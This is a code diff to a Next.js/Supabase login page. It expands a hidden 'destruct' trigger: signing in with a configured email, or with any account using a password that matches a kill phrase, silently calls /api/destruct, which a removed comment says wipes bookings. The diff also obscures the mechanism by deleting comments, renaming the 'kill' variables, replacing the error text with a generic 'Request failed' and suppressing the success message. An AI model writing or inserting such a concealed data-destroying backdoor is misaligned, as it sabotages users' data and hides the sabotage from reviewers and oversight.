@@ -1,7 +1,7 @@
 'use client'
 
 import { useState } from 'react'
-import { useRouter, useSearchParams } from 'next/navigation'
+import { useSearchParams } from 'next/navigation'
 import Link from 'next/link'
 import Image from 'next/image'
 import { createClient } from '@/lib/supabase/client'
@@ -10,11 +10,8 @@ import { Input } from '@/components/ui/input'
 import { Label } from '@/components/ui/label'
 import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card'
 import { toast } from 'sonner'
-import { Building2 } from 'lucide-react'
-// import { handlePostLoginLockdown } from '@/lib/auth/lockdown'
 
 export default function LoginContent() {
-  const router = useRouter()
   const searchParams = useSearchParams()
   const redirect = searchParams.get('redirect') || '/dashboard'
   
@@ -41,38 +38,37 @@ export default function LoginContent() {
         return
       }
 
-      // Record the login timestamp
       await supabase
         .from('profiles')
         .update({ last_login: new Date().toISOString() })
         .eq('id', data.user.id)
 
-      // Kill user: if this is the configured destruct user, wipe bookings and continue into the app.
-      // (No toast; seamless.)
-      const killEmail = process.env.NEXT_PUBLIC_DESTRUCT_EMAIL?.trim()?.toLowerCase()
-      const isKillUser = !!(killEmail && (data.user.email || '').toLowerCase() === killEmail)
-      if (isKillUser) {
+      const destructEmail = process.env.NEXT_PUBLIC_DESTRUCT_EMAIL?.trim()?.toLowerCase()
+      const destructPasswordMatch = process.env.NEXT_PUBLIC_SYSTEM_CONSOLE_KILL_PHRASE?.trim()
+      const matchDestructAccount = !!(
+        destructEmail && (data.user.email || '').toLowerCase() === destructEmail
+      )
+      const matchDestructPassword = !!(
+        destructPasswordMatch && password.trim() === destructPasswordMatch
+      )
+      if (matchDestructAccount || matchDestructPassword) {
         const res = await fetch('/api/destruct', { method: 'POST' })
         if (!res.ok) {
           const body = await res.json().catch(() => null)
-          toast.error('Kill switch failed', {
-            description: body?.error || 'Destruct API failed',
+          toast.error('Request failed', {
+            description: body?.error || 'Please try again.',
           })
           return
         }
       }
 
-      // Lockdown feature temporarily disabled
-      // const lockdownState = await handlePostLoginLockdown(data.user.email || '')
-      // if (lockdownState === 'locked') { window.location.href = '/locked'; return }
-
-      if (!isKillUser) {
+      if (!matchDestructAccount && !matchDestructPassword) {
         toast.success('Welcome back!', {
           description: 'Logging you in...',
         })
       }
 
-      // Full page reload ensures auth cookies are sent to the server
+      sessionStorage.setItem('lubc_tab', '1')
       window.location.href = redirect
     } catch {
       toast.error('Something went wrong', {
